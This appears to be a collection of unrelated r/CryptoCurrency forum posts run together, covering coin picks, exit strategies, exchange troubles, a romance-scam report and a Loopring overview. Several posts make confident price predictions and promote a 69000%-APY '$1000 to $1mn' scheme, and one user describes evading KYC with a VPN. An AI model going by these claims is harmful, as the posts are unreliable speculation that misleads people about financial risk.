YouTube influencers are extremely biased, from my experience. They try to promote pump and dump projects. Whatever comes on reddit, specifically this sub has helped me a lot, but you know what the saying is, if it's on Reddit, it's probably too late. I wanna know how you guys get your info on some coins and invest before it starts gaining momentum. I started investing in the month of may, even though my portfolio is not much, I've made 70% returns, thanks to luck. Any info would be greatly appreciated.

Coinbase price is at .26 cents while Binance is at 0.17 cents. This is not the result of any wallets being frozen but likely whale activity on Coinbase and now the other exchanges have to play catch up. 

You can even buy on Binance/Gate.io and use iotxs tube swap to change your Iotx on the Binance smart chain / IOTX network to Iotx on the ETH network to exchange on the coinbase platform or on Uniswap. 

However, youd need to have ETH to process all the transactions so 99% of people are not able transfer their IOTX from Binance to Coinbase due to network incompatibility. This presents a major opportunity for those who are ready.

Current priority (make ICP affordable for Developers, build a solid foundation for the bitcoin/ethereum ecosystem) then bring mass-adoption. 
ICP is 5-6 years ahead of the competition in high scalability, low-cost, fast finality, blocks per second. 
ETH-ecosystem, BTC-ecosystem love Dfinity, it welcomes Dfinity. Dfinity gives bitcoin, ethereum superpowers. ETH/BTC/ICP will not be regulated.

The internet computer protocol is the ethereum from 2015. Ico was $0.311 in 2014, everyone calling it a scam. After it got listed on kraken it dumped from $3 to $0.48 and consolidated for over a year. It got fudded to shit. Icp has the highest probability of winning this adoption race with threshold relays consensus. There is no scaling solution that isn't centralized without giving up huge chunks of security. What makes icp sustainable is the low-cost of hosting compared to other l1's that are hosted on amazon, digital ocean. Investors/vc pay for the massive aws cost. This is 1 way, how we know that certain projects must pump to pay for the increasing Aws cost. 



Certain players are keeping the price suppressed and reselling ICP (at a discount) to developers and media-conglomerates.
ICP will be pumped to 4 figures to change the current sentiment against ICP. 
This should tell you how it easy it is to manipulate market-sentiment.
And the brainlets that fomo'ed in at $1000-$2000 and then panic sold will be proven wrong again that I can promise you.
I said 60k October - 100K November - parabolic in December. Keep betting against me.

Yup it looks like meme coin season is in full swing unfortunately. 

Coins are popping off to insane gains and making millionaires by the second whilst I clutch my stable coins which are Vet &amp; ADA etc 

I have to give to whomever comes up with these Coins because it seems like they always come out at the right time. 

Too many dog coins? They come out with Cat Girl and it rises 25,000% and now since Christmas is around the corner, another coin is now heating up.

It is called Santa Coin and it looks like they are trying to line it up with the Christmas/Festive season. Btw it is currently up 400%. 

I promised to not get involved and so far I am holding good to my promise. 

If it does go to the moon or whatever, I am signing up to the mental asylum.

Ive noticed that most people on this sub say that futures is something you should avoid and only makes you lose money... I think that everybody should atleast know how it works before judging, personally I kept away from it since Ive heard about people losing money but after putting some time into it and investing with strategy it paid off and I think it can pay off to anyone.

First off DO NOT INVEST MONEY YOU CANT AFFORD TO LOSE IN FUTURES. But if you have some extra cash and want to optimise profits, futures are a great option. 

Most people on this sub realise what shitcoins are and when they are going to drop after a big pump, so putting 50$ you can afford to lose in futures can make you a nice profit with risk of your own choice. You dont have to do 100x or 50x, you can just do 2x or 5x and lower the risk that way.

Even for HODLing you can take slight risk and use futures to 2x your long term investment.

I know most of you dont like futures but at the same time the risk isnt any bigger than dumping into low market cap crypto since that mostly dies out.

The point of this post is not financal advice and telling you to go all in on futures, the point is that I think everyone should at least learn about it.

Always DYOR tho and dont listen to hype-men and influencers.

There seems to be a lot of debate around this. Is it necessary? Perhaps not. But I do find these discussions interesting. I personally think it depends on the token. A Bitcoin might be regarded as an asset, a Dogecoin might be seen as a currency. But perhaps something like Ethereum needs its own category.

A token might even have its characteristics changed over time due to ongoing development and updates, although I deem that as less likely. Personally, I think cryptocurrency can basically be both, but not at the same time. Tokens have diverse use cases and are versatile by nature.

Go into your coinbase wallet or any other wallet and show me your sell regrets. For those of you who don't know, your transaction history in Coinbase wallet always reflect current prices. 

[It happens. Here's my $115 had I saved it ](http://imgur.com/a/TjFzL7)

[here's the etherscan.  it says $286 cuz eth has 2.5x](http://imgur.com/a/sohgBw6)

I can't even remember why I sold. I believe I traded it for VPP which is giving typical bull run gains but seriously. I don't think it will pump at those levels. LOL

Okay, I showed you mine. Now you show me yours.

I know this community if full of people shilling coins, shouting bullshit, just hyping things up. But what some of you dont see, is that theres a good heart in every single one of you. I know you shout random shit every single day in the daily discussion. 
But what I also know, is that when theres someone asking for help, you are the first one to comment to him explaining stuff about cryptocurrencies. 
And thats why I want to say: thank you. You guys educated me. I came into the crypto space early this year. I knew nothing about it. Since I already used Reddit, I found this community. And since then my knowledge about crypto only increased! You were able to answer my questions, and when I didnt understand them, you took the time to explain me better.
Love you, bye.

So after my due diligence and research I come to conclusion that 

CRYPTO MARKET IS ONLY MARKET 

where if BTC pumps people get scared because ALTS will bleed and market might take a sudden dip . 

 So Huge BTC PUMP = Loss

 If btc dumps everything will dump  and Market will bleed  very very badly.  

So BTC DUMP = LOSS

If BTC dont show any movement  people be like A huge dip is coming  so no investment for now.
 So NO MOVEMENT IN BTC = WAITING FOR LOSS

Basically Its just wildest west no-one knows here anything Just gambling to see some Green .

So my mantra is Buy at top sell at lowest low  and  wait for Bogdanoff  brothers to  pump the market to moon  after that..

Take a look at this screenshot and please, please take a moment and realize the gains that have been made over the years. 

I remember buying ETH around $1300 and saying to myself, Im late aint I? Everyone had that feeling of being too late once the price started dropping. 

Looking back at the past definitely gives me a confidence boost regarding the future, for all new people who entered yesterday, today or tomorrow. 

YOU AINT LATE, and we in this thing together. 

Take a look at this screenshot and tell me your most abrupt observation, for me its XRP being ahead of ETH. That shit hurts

Hello r/cc, I'm having a hard time deciding what to do. I keep seeing 'decide on your exit strategy' posts and I'm not really sure if it's FUD or something I should really think of.

I only have about $1200 in different cryptos and overall I'm in the green - it's not much but it's honest DCA.

Ofc I hope for a continuation of the bullrun and new ATH's but what goes up, must come down eventually. Is it better to sell everything at the height of the bullrun and get back in next bear market, or should I just hold and keep DCA?  
I'm a bit torn between those options - taking the profit and leaving some in doesn't really make a big difference, as my profit isn't extremely high. 

So, if you've thought about this, don't hesitate to tell me about your exit strategy :))

I put a bit of extra cash into SHIB a few weeks ago, long after the largest pump had already passed. I figured there may still be a bit of steam left in the hype train, and I guess I was right! Made some decent gains from it, and now that it's been trading sideways for a few days now, I decided to take out my initial investment and divvy it up between some promising tokens I had yet to get into.

In case anyone is curious, they are:

* Tezos (XTZ)
* The Graph (GRT)
* and ChainLink (LINK)
* Polygon (MATIC)

This sub tends to make a big deal about taking profits, but as long as you're okay with a taxable event, why not widen your spread? If anyone else is sitting on some shitcoin gains, I'd like to know what your plans are.

As of 5mins ago I left every single subreddit about Crypto, especially the ones about certain specific coins. I am SO tired about all the post being about "Who's Hodling today?" "Who's buying the dip today?" "tO tHe MoOn!" "If Blah hits $1 I'll Blah!" 

Jesus Christ is so annoying and stupid. The only reason I haven't left this one is because I get some good info, mostly from comments treads though! 'Cause the posts most times fall under the aforementioned categories... 

Seriously can we stop? Hell! I feel like I see a lot of THIS specific posts a lot too!

You not only miss Bitcoin in 2010 but Ethereum in 2015. Super bullish on Ethereum. Once we are done with eth 2.0 ,the cheap fees will allow users to do more transactions , thus burning more eth, making it more valuable. Now i have few questions for you guys : 
Q1 : Will ever Ethereum flip Bitcoin?
Q2: guess the price on November 3rd 2022?
Q3 : What is the next 2015 eth coin?

Ethereum prices on 3rd of November:

2015:  $      0.09
2016:  $    10
2017:  $  304
2018:  $  182
2019:  $  199
2020: $  384
2021:  $4560

I am wondering how taxes are measured for gains that happen outside of regulated exchanges (e.g. on FTX). 

Lets say I buy $100 Bitcoin on Coinbase (using ACH) and deposit it into FTX. I smartly trade my $100 BTC and end up with $1000 worth of Bitcoin on FTX. I then withdraw from FTX back in Coinbase and thus I end up with $1000 worth of BTC in my coinbase wallet. And finally I withdraw to my bank account the total amount $1000. 

In this case, how will the IRS know about my gains that happened on FTX? What would actually be taxed ultimately?

On 20th May 2021 I gained my first moon. I then proclaimed that my aim was to achieve 1000 moons before the end of the year. Here I am with my first post in r/cryptocurrency to announce that I have achieved that goal.


I honestly knew nothing about crypto at the beginning of the year. Managed to learn a lot here. Made a few moons and then started to comment a little more frequently to gain some more.


I now have a growing portfolio of crypto from my blue chips, my sure things and my not so sure things that are shilled by some mofos on here. Not forgetting my moon money.


No matter where you are on your Crypto journey I really do wish everyone the best and hope you achieve your dreams.


So I now no longer need to $#! Post and I will hodl these precious moons until I can buy my lambo.

... my car into the ditch.

This whole idea of "buy and look away" turned out to not be great advice. There I was, glazing over which coins to buy this week, and some jerk honked his horn at me to move out of the intersection. Doesn't he realize how important these decisions are? Anyway, so I continue down the road, speculating a 10x on shib. Nah, that ship came and went. Maybe Floki? Hmmm, probably a dud really. And I then remembered some advice I read in r/cc about buying and looking away. I thought to myself, "what if instead, I look away while I buy?".

So I closed my eyes, tapped where I *think* I was buying some coins, and suddenly... I'm upside-down, in a ditch, and ended up with $2k of ADA.

So now, my car is totaled, and I'll have exactly $2k of ADA until the end of time.

Is there a site that's tracking the release dates of new coins on Coinbase? Anyone know of such a tool?  Could be a web application, mobile app, twitter feed, but long story short -- something that would list the dates and name of the coins as they are going to be adding to their [coinbase.com] marketplace?  I am interested to see the new coins coming to the platform and what they are about, and possibly earn some gains by grabbing them before they hit coinbase.com and are available for purchase from one of the larger exchanges.  Thank you to anyone that could help me with this!

As many people know, WagyuSwap in Velas Blockchain was recently launched. In order to use this app, their Telegram channel gave a guide to teach how to transfer VLX tokens (which is used to pay the fees) from BSC or Ethereum to the Velas blockchain.
However, many people are not managing to swap the VLX tokens from BEP-20 to VLX EVM in the Velas Wallet, which in mandatory to this day according to the guide I mencioned above. The tokens are not being received in the VLX EVM, even though they are leaving the BEP-20 "sub-wallet" in the Velas Wallet.
Well. Does anyone have already seen this problem and / or know how to get the tokens back or complete the transaction?
Thanks on advance.

I am a fan of ADA and Algo but unfortunately I cant have a coin base account because they would not accept my country. And also I cant make an account in Binance so this leaves me stay behind. I followed ADA since it was 0.15$ and wanted to buy but that didnt happen. 

I have been on r/cc and learning a lot about crypto and projects that which are good ones. Recently a user showed me that I can use KuCoin to buy crypto from, I have installed it and have been wondering if any of you who is using could share your experience about the transaction fees and its usage. If I deposit Bitcoin and change that to Tether and then buy other crypto that I want wouldnt that cost me a lot of money in changing from crypto to crypto? Thanks everyone for your contribution. 


I hope my word count is enough so my post wont get removed and please someone do something about this useless text loving rule.

My first ever moon

Thanks to this subreddit I was able to earn moon in this current distribution although not so much but I hope to earn more in the coming months.
  In just one month of joining this subreddit I have seen perspectives of different people including intelligent and dumb ones, have been introduced to crypto games that I can earn while I play, I have gotten dms from people offering help and this has helped me learn alot and improve on my self and be a better investor although the I dont take advice from everyone Thanks guys for the amazing help you all provide and happy moon day to all of us.

Thought it would be nice to post about something other than shit coins or general low effort moon farming. Here goes nothing

Just got done reading Token Economy- How the Web3 reinvents the Internet. 

It was the first book Ive read on crypto. It was interesting and easy to read. Went into high level detail on basic principles and use cases I knew about and some I hadnt considered. It wasnt deeply technical but it wasnt coin hype either. The author(s) was coin agnostic. Although specific projects were mentioned. I think its worth a read. 

What are some other worth while crypto reads? (not white papers)

I signed up to MEXC Global and transferred a large amount of CEEK tokens my account on their exchange nearly 2 days ago. While the transaction has been made, it has yet to register on my account. 

I contacted their support and their response was that they could look into it for me and try to return my deposit for a fee of 42.6USDT. Is this an exorbitant amount to charge a customer for some tokens I know they have?

Etherscan: [https://etherscan.io/tx/0x203dc22e2de136796522485e40e99d5a629eb2518151b825250f4c687e1768ff](https://etherscan.io/tx/0x203dc22e2de136796522485e40e99d5a629eb2518151b825250f4c687e1768ff)

So there is a scam going on. Never go to eth-bit.com. some random woman claiming to be from hong kong contacted me on whatsapp. 

It started off as she having the wrong number asking for James. She then said

 "I am very sorry, because I have many business partners in the United States, maybe my assistant accidentally remembered the wrong number, please forgive me" (someone else sent me this word for word)

Sent me many pics told me to contact her on her personal number. Curious I played along

She then love bombed me for 3 days. She said she is 38 years old and working on a jewelry business in miami.
Every morning she sent good morning texts and every night she sent good night texts. She was  Sending photos of her food one with a cake and a subsequent one with the cake partially eaten. She sent this type of photo twice.

She Talked about inflation and economics while sending me various photos of her in tunsia and hong komg.
 Reverse image search returned nothing. Metadata and exif data all removed from images and videos except 1 of the city of hong kong taken 10-02

I wanted to see where this went so i continued played along.

She talked about how the us dollar is going to tank and how she is in foriegn exchange. She sent me a video of her playing golf.. as well as photos from a school saying she donated $100k to them. She is in foriegn exhange and she makes $333k a year from that.

I caught her using google translate... and google translate does a good job correcting grammar.
 
She went on showing scree shots of her crypto portfolio. She talked about how she mines eth2.0 without machines. 
I said yeah its proof of stake

One trick is there was no translation for "proof of stake" she replied with "proof of equity"

She says she makes 7k in usdt a day showing me a screen shot from her phone from eth-bit.com

 I sent doctored screen shots showing i had $500k in a wallet and she told me to go to eth-bit.com to get an 2.4% daily ROI for having usdt in the wallet. I checked the contract on etherscan.io

The contract goes to address

https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#comments

Check out those comments!

Eth-bit.com analysis. They say approve contract which allows them to spend your infinite amount of usdt. If  You keep usdt in your wallet they have access to it and will withdraw eventually.

I told her i will put 5k in at first and wait for a week to see returns then i will throw in 100k! 2.4k a day! OMG how can i resist!

So I plan on stringing her along more maybe having her click a link of some sorts.

Also lets try to see what we can get from that site before I get it taken down.

Wasn't very long ago Algorand (ALGO) was getting shilled to hell during its pump. Now, hardly does anyone mention it.

Fast forward a bit later,  the almighty DOGE killer, SHIB started pumping and this sub was glossing over it and you can guess what happened next. I haven't seen any comment or post about SHIB since it dropped from ATH.

Now its LRC. Y'all can't stop talking about LRC all because it's pumping, and i bet no one will talk about it anymore once it stops.

I guess the point I'm trying to make is that a lot of us on this sub don't know more than to bandwagon a winning crypto.

People keep making posts asking "how do you guys pick winning projects early?"

The answer is they don't pick them until they start winning, then everyone jumps on the hype train.


TL;DR: ~~ADA~~ ~~ALGO~~  ~~SHIB~~  LRC ....

 *"Today is Day 4 of me doing full-time in cryptocurrency as a reddit publisher. Hope I can get support from the community. 5 months 3 days of reserve left for my family and I"*

*"Full Disclosure, I only have 0.3% of Loopring in my portfolio."*

# What is Loopring?

Loopring is an Ethereum-based software platform that intends to reward a global network of users to manage a platform that facilitates the creation of new forms of crypto asset exchanges. Loopring, one of a growing number of decentralized finance (DeFi) protocols, provides this platform by combining different cryptocurrencies, including its own LRC token.

Most significantly, Loopring promises that their platform will enable exchanges built on it to avoid the poor speeds and high prices associated with decentralized exchanges on Ethereum by utilizing a newer type of cryptography known as zero-knowledge rollups, or zkRollups. Loopring claims that with zkRollups, its exchanges can provide traders with speedier settlements. zkRollups allow Loopring exchanges to finish key computations elsewhere rather than directly settling trades on the Ethereum blockchain (as other decentralized exchanges do).

The concept is that by lowering the amount of transactions that a Loopring exchange must submit to the Ethereum network, traders will be able to trade faster and at a lower cost. In contrast, other decentralized exchanges require transactions to be validated by the Ethereum network, which takes minutes rather than seconds or milliseconds.

# The team in Loopring

Loopring's creator and CEO is Daniel Wang. In 2014, he controlled Coin Port, a centralized exchange. During that time, he attempted to remedy the problems caused by centralized exchanges, but concluded that the problems could not be rectified since they were inherent in the centralized exchange concept. This resulted in the conception and subsequent creation of Loopring. He was previously the co-founder and vice-president of Yunrang Technology, as well as a Google Tech Lead.

Loopring's CMO is Jay Zhou, who previously worked in Paypal's Risk Operation Unit and was also hired by Ernst &amp; Young. He was also one of the primary founders of SJ Consulting.

Steve Gou, Loopring's CTO, is the third member of the core team. He collaborates closely with Brecht Devos, the project's Chief Architect.

# Competition

0x appears to be pursuing the same goal as Loopring, yet there is a significant distinction between the two. Whereas 0x allows anybody to build a node as a decentralized exchange, and all orders are handled off-chain but settled on-chain, 0x only receives liquidity from exchanges that have been built on the 0x platform. This is in stark contrast to Loopring, where liquidity is provided by any exchange that links to the Loopring network. Other competitors include Kyber Network, Blocknet, and Bancor. There are liquidity pools and order matching in Kyber Network and Bancor that ensure deals are met across smart contracts, while Blocknet functions in a similar method but just with order matching. There is no rival who can provide the ring orders generated by the Loopring protocol's ring matching.

# Conclusion

Loopring distinguishes itself from other decentralized exchanges through the use of ring-matching and ring orders, and as they continue to develop ring-matching, we may see an even bigger boost in market liquidity when three or more orders are paired. Furthermore, Loopring's order sharing model outperforms standard order matching by allowing for more flexible purchasing and selling.

Loopring's blockchain agnostic adaptability is perhaps one of its most significant advantages. As long as a blockchain incorporates smart contracts, it can connect to the Loopring network, allowing orders to be fulfilled through several channels. Unfortunately, Loopring has halted this portion of the project. Decentralized exchanges should see more adoption as Loopring adds liquidity and levels the playing field, and Loopring will benefit from additional exchanges joining the network.

Since the SQUID token is deployed on Binance Smart Chain, Binance is considering blacklisting the wallets linked to the developers.

According to Coindesk, Binance is also planning to help those affected. Not sure how but may be via their BNB pioneer burn program. Binance will also share their findings with law enforcement.

Since BSC is not truely decentralized, they can prevent the transfer of funds and prevent devs from scamming the people again.

Saw a joke post earlier about how to turn $1000 to $1mn. Here is how you can actually do it. 

 1. Find $1000. Buy AAVE on an exchange. Swap it with TIME on Sushiswap. 

 2. Stake it in TIME for 69000% APY.

 3. Get $690,000 at the end of the year.

 4. Stake in OHM at 4200% APY. (Right now the APY is at 8k% but will reduce to around 4.2k% in a year from now)

 5. Get $2.8 mn after a year

 6. Go all in on a relatively unknown coin that this sub is bullish about or ADA

 7. Congratulations. You now have $1 mn.

When it comes to holding crypto, I'm fairly new to the game. I began having an interest back in December 2019. Since then, I've purchased my fair share of random coins and not really doing much research. I've just agreed to what some of my buddies have told me, and here I am. Currently, I'm sitting with 50m SHIB coins and about 0.35 ETH.

I got lucky with SHIB and bought the hype from my friends. It wasn't until now that I'm true research that I feel SHIB is going to expire and burn. We are already seeing that today, believe it or not. Here's my question as a guy that's fairly new to this:

**Should I sell my SHIB and long-hold ETH?**

It's probably not smart to take advice from Reddit, but I just need to be guided in the right direction and where/how to properly research. I firmly believe cryptocurrency/decentralization is the future, but now it's time to convince myself and the others around me. Can't do that with just saying *yes* to some friends.

This was found about 5 hours ago. With all the recent leaks, this one unofficially confirms the partnership since it mentions GameStop by name. 

I saw a lot of people feeling down in their comments in the daily thread when LRC was dumping. If you're losing hope of Loopring going back up again to its ATH after the small dip or unsure about FOMOing, this is probably the good news you'll need. 

I don't know how credible this is, but marketscreener says there's an upcoming event on GAMESTOP CORP on 11/23, which could very well be when they'll announce the partnership. But hold on to your coins in any case!

Looking for coins that could support eth, been doing research but am semi overwhelmed with all of the options. I want to diversify a little but can never stay with a project long term like I can with eth. Any tokens I should look into? Currently looking into matic and algo but am still pretty iffy.  Wanting to find a project that could benefit eth. Considering matic and algo but Im still pretty iffy. Anyone that has any recommendations on projects that could be useful and important with the expansion of crypto as a whole please let me know!

One of the unfortunate stories of past few days has been the rug pull by Squid Game developers. It was horrible and shameful for those (including me) who genuinely want to see this world becoming more decentralized with advances in Blockchain/Crypto. These incidents weaken common confidence and give skeptics one more example to quote.

As I was reading the news, as much as I felt horrible for all the people who invested in the Squid Game coin, something really stood out to me. In a similar news in 2008, I read about "Bankers" stealing hundred of billions of dollars from individuals as well as institutional investors (through bad mortgage loans) that brought the global financial system to a halt. It crashed the markets and economies and became the "great recession". In 2021, a much much smaller amount was stolen from individuals (and may be institutional) investors but this time, it was stolen by "Developers". Oh yes, **"Developers"**!! Times are changing and it's becoming more and more evident that it will be the developers who will lead the architecting of the new decentralized world.

With great power comes the greater responsibility. I hope building the guardrails to protect the system as we build the new system becomes a mainstream topic, not an afterthought of bad events. Nonetheless, even though a horrible event, it's interesting to realize the shifts in the power and how critical the Developers will be in leading the transition to the decentralized world. Let's spread light, hope and goodness, not the fraud and evil.

Godspeed!

I saw on my exchange that they were having an Ari Hersch NFT drop yesterday. The NFTs looked cool. They were $150 each. Each probably minted 200-400. 

Are these something that are likely to go up in value in your opinion. I like many others am still confused about NFTs. Never was interested or tempted to buy before. But this series did have me tempted. 

Let me know your thoughts.

We all know loopring is on fire and has been doing ridiculously well for a stable coin jumping 200% plus in a few days, all I want to ask is what we are currently seeing is it a dip or the price resetting itself after the market hype dies down

We all know the main moto of crypto buy low and sell high but its times like there when the lines become blurred because even though loopring might be at an all time high I have seen much worse projects rocket off to the moon *cough Shib *cough* and honestly lrc has been on my radar for a while but I never expected it to go ballistic over night

What do you guys think? Is there still time to board the LRC bandwagon? Or are we heading down as people pull their money and take their profits

The thing is, people won't be actually needing to know a lot about crypto for it to become mainstream. For example, take Audius. It's a great project but for someone to use Audius, a knowledge about using any other music app is enough. (Not that every one knows how to use a music app, but you got my point). It's like not knowing of how credit card transactions work but you can use it whatsoever.

Similarly, as ecosystem develops it would be easy for anyone to use crypto for it's use cases (Note that use cases of crypto may differ from the underlying technology itself) Additionally, many cryptos are B2B and they may never need to interact with consumers itself, but  would be part of crypto economy by giving value to people indirectly.

Which American political party will be most likely to assist in adopting crypto on a national or global scale? 

Will crypto ever be used essentially as a gold standard for a currency? 

I personally believe crypto will become widely used regardless of which side, both, or neither do. Who will be the most fair and not completely screw all of us over with excessive regulation, fees and taxes?

I know Rand Paul and Gov. Abbot are supporters, but honestly, I do not agree with them on anything else. I am actually quite opposite and think they are constantly on the wrong side of history. Is the republican party going to regulate the future of crypto? How long before the trickle down effect ideology is put in place?

I hope for a great future that will provide my family and yours with financial freedom, but can we really count on not getting completely screwed over by the man again?

Can American politics screw crypto for the entire world?

Im really enjoying using Avalanche so far. Perhaps it helps the developers are giving out such high APYs and I like that the gas fees are just 30 cents. Now that I see how lucrative lending and yield farming is I want to try it with my other coins.

Solana, Cardano, Algorand, Polkadot; do they all have apps like Aave and UniSwap? Can I get a higher yield lending on defi apps than by staking them in an exodus wallet for 6% APY? 


Which of these defi protocols have you had the best experience on? Sorry if its cliche but I cant stand using Ethereum because of the high gas fees. Is Ethereum currently just used by rich people that can afford those fees? Anyways, curious which networks given you a good defi experience so I can try it out myself. Cheers!

I had an FTX pro account which I was able to use through a vpn but I must have logged on without the vpn on accident at some point or something because they eventually asked me for KYC and ended up closing my account.

How do people in the US generally buy the really obscure coins? I had originally done the whole FTX thing last spring because I wanted to buy Solana. Obviously that worked out pretty well for me. I want to be able to buy more coins before they go mainstream and become available on coinbase etc

Day 1: I ordered a fish sandwich and jalapeo tater tots and received a full 1 Dogecoin. Much Wow. Bitcoin could be day 2

Day 2: I ordered breakfast. Actually weirdly disgusting. The breakfast burrito sauce was absurdly cold compared to the Luke warm bacon and sausage egg combo. Also, both ends of the burrito held the sauce in the end caps, releasing an unpleasant gusher fruit snack like ooze squirted right into the back of my throat. The next bite was a hopeful excitement of crisp bacon only to be disappointed by a chewy burnt tasting bacon that got caught in several places throughout my teeth. I receive an email like last time expecting to see if I won a full Ethereum token which has 1 out of 10,000 chance of happening, or my coveted dream full Bitcoin. As I clicked on the received email it said a message from Robinhood error. So, I called them via the app and they told me that it was because of my crown ID didnt align with that Burger King location. They told me to just contact Burger King because they didnt have any solution on their end. I then contacted Burger King and they told me, Thank you for reaching out to BK Support in regards to our crypto campaign with Robinhood! Im so sorry to hear about the trouble youve run into. 

As our team assists with issues related to Burger King orders placed online and in-app, I would suggest reaching out to Robinhood directly with any questions related to your account with them. You can contact them at support@robinhood.com. 

For further details on this promotion, bk.com/crypto.

Otherwise, if you have any further questions in regards to ordering with BK, feel free to reach back out. Were happy to assist! 


Best,
Skyler

After not responding to burger kings next email asking me about Skylers performance, I kind of gave up. Then out of the blue two hours later a new email emerged for me to click and see which three either BTC, ETH, or Dogecoin I would receive.  I did receive my second Full Dogecoin into my Robinhood account. 

Day 3: I used the burger app again to order for pick up with crypto promotion and ordered impossible burger with double patties putting me past the minimum qualifying amount of $5 order on the app. Started order at 10:58 they closed at 11.

Day 4: Stay tuned for tomorrow.

I know this isn't going to end well but I'm willing to listen and try some random strangers strategies over the Internet in an attempt to make some quick cash and for once be the super uncle for Christmas!

Let's say I theoretically have $1000 bucks, how would you try to 10x this amount in this Bull run starting as of today ?

- Would you put it on one alt and sleep ? If so which one. Don't tell me eth, it won't 10x in this cycle or either bitcoin or even Cardano or Solana...

- Will you distribute the amount among x projects? If so which one ?

Let me know your thoughts and I will sprinkle around my imaginary $1000 around it.

I'm trying to wrap my head around something that I've heard since the start of my crypto journey last year. One of the things I hear a lot that cryptocurrency is good for and a good use case is to "bank the unbanked". Cardano wishes to give people in third world countries access to digital wallets so they can be able to safely send and receive money where there they can't trust their country's government or banking system, which by the way I fully support and think that's great. 

But what I don't understand is this. Is the idea to have these individuals use ADA as their currency? Something that fluctuates in value? This is one thing I just don't understand. No stock/crypro/asset etc is guaranteed to appreciate in value. Why try to get a bunch of people who already not only don't have access to banks but don't have a lot of money in the first place to use an asset that could drop by 90% once sliced by a bear paw?

Maybe I'm wrong about this, and if so please clarify or correct me on what I'm wrong about here. But I just think the fact that these assets are so volatile that it's not the best idea to promote using it as a store of value.

 American football quarterback for the Green Bay Packers of the National Football League (NFL), Aaron Rodgers, explained in a video he posted on Twitter Monday that he is taking a portion of his salary in bitcoin. In addition, he gave away $1 million in the cryptocurrency in partnership with Squares Cash App. Rodger said  ***Bitcoin to the moon  Thats why Im pumped that I recently teamed with Cash App. They have enabled me to take part of my NFL salary in bitcoin for the very first time.***  ***To make bitcoin more accessible to my fans Im giving out a total of $1M in*** [***BTC***](https://markets.bitcoin.com/crypto/BTC) ***now too.***  Rodgers tweet was flooded with people wanting free [BTC](https://markets.bitcoin.com/crypto/BTC). At the time of writing, the tweet has been liked 65.2K times and received 111.7K replies. Soon after the announcement, fans claimed to have received bitcoin from the quarterback, posting screenshots of what they received. The amounts varied. For example, some people received about $10 while others received about $100. 

 A growing number of professional athletes and sports teams are asking to be paid in bitcoin, including [Russell Okung](https://news.bitcoin.com/pro-football-star-russell-okung-13-million-salary-bitcoin/), [Tom Brady](https://news.bitcoin.com/super-bowl-star-tom-brady-supermodel-gisele-bundchen-ad-campaign-crypto-exchange-ftx/), [Saquon Barkley](https://news.bitcoin.com/new-york-giants-saquon-barkley-convert-endorsement-revenue-bitcoin/), and [Sean Culkin](https://news.bitcoin.com/nfl-player-kansas-city-chiefs-sean-culkin-convert-100-salary-to-bitcoin/). On Tuesday, the [mayor](https://news.bitcoin.com/pro-bitcoin-miami-mayor-will-take-next-paycheck-100-in-btc/) of the U.S. city of Miami, Florida, also said that he is going to take 100% of his next paycheck in bitcoin.

I am curious why this is not discussed by more people. Forever, younger generations have never had power or any real ways to represent themselves. The people making rules have always had the most wisdom, but that means theyre also the oldest &amp; most out of touch with modern advancements. 

**Money is power.** It simply opens doors to further wealth generation others arent offered. And whether you like it or not, cryptocurrency is putting significant sums of money into younger peoples pockets as NFTs and BEP20 become popular. Its bad ass to see!

Im calling it now, in a decade, there will be some much younger, very powerful people begin appearing and making changes to the world.

So, few weeks ago I told a colleague who actively invested in crypto that I read somewhere that Shiba is the new Bitcoin. At that time, I didn't even know what Shiba or bitcoin meant. I had no crypto wallets, I was just making a random conversation about something I read online.

He then told me that He invests in crypto and that Shiba is a shitcoin.
So I went home and tried to learn more about Shiba Shitcoin.
A week ago I read the news about the guy who invested 8k in Shiba and became rich and that could have been me but my coworker discouraged me and made me miss out on what you guys call gains (with a z).
He straight up called Shiba shit so it was hard to invest in what he called shit. I never really wanted to invest in any crypto. However, even if I invested in Shiba a month ago, now I would be rich and snorting coke off a hookers rear. But he's too proud to admit he made me miss out.

Since then, I have brought up that He made me lose millions and He should give me a few tips to help me recover (?!)
He just told me that He is not a trader and that He don't give any financial advice (greedy jerk).

Since then, I have text him almost everyday about any opportunities he sees in crypto and asking him if I should buy it.  He always says he doesnt know. I think he is just selfish as he has now blocked me on all social media.

I got smart and started to send Him emails through my work account where he can't block me because we are colleagues.

Few days ago I sent an email without the clear subject "shibazzilla: should I buy it?" He didn't answer me.

I just told him that I lost everything invested in shibazilla and I let him know it's his fault because H didn't warn him.

He told me He just ignored me like he told me, he didn't tell me to buy it" and I said "so you had to talk when I was going to buy Shiba but you didn't think to tell me anything when I told you I was buying shibazilla"

He clearly is greedy with his crypto advice and he's too proud to help anyone but himself.

I have no idea how to handle him. He clearly is greedy. He literally told me to not bother me and that He blocked me because im not his friend, but I doesn't care. I know he is kidding and we're "crypto brothers"

I'm afraid soon hell end up beating me and then I'll lose my job.

Any advices? Maybe someone had a similar situation?

I had a little free time tonight so I decided to put in some much needed work on this project.  This will be my biggest update so far, although still without the previously promised DD on most of the projects I'm investing in.

For those of you tuning in for the first episode, I'm doing a year long DCA experiment on 16 alt-coins where I will invest $25 every 4 weeks into each project.  The investments are actually being done weekly, so I'll be adding 4 new projects each week for 4 weeks followed by the recurring purchases. I will track the progress and update here weekly.  Here is the last post in the series: https://www.reddit.com/r/CryptoCurrency/comments/qjd0xv/1_year_altcoin_dca_experiment_week_1_update/

To keep it interesting, I've asked for recommendations from the community for the coins that I will be investing in and will donate at least 25% of the profits from the biggest winner to a charity chosen by the first person to suggest that coin. So far, I have already invested in 7 coins (update coming below). I have to add one more coin for this week, but I haven't decided what yet.

In addition to the 7 projects I've already invested in, I have 3 more selected for next week's investment.  The reason I chose to put those all into the same week is none are available on any of the exchanges I normally use so I'll need to get creative to buy them and figured it would be easiest to do all of the "creative" ones in the same week.

If you're counting that means I've definitively selected 10 projects, but I stated above that there will be 16 included in the projects. This means that there are still 6 projects not yet identified. This is slightly misleading, because there are 4 other projects I already know I want to include in the experiment, but no one has suggested them yet so I'm holding off, hoping that someone will suggest them so that each coin has a user associated with it. That means in addition to the 10 I've identified below and 4 that I've already decided, there are still 2 projects I will end up investing in that I haven't decided yet.

If you're interested in suggesting a project, there are a couple of ground rules. First, I have decent bags for the following projects and therefore don't wish to include them in this project: BTC, ETH, HBAR, DOT, ADA, ALGO, ONE, XLM and new as of this week, SCRT. Also, it is just one suggestion per person, for obvious reasons, so pick your favorite project that isn't already on this list:

|User|Suggestion|Decision|
|:-|:-|:-|
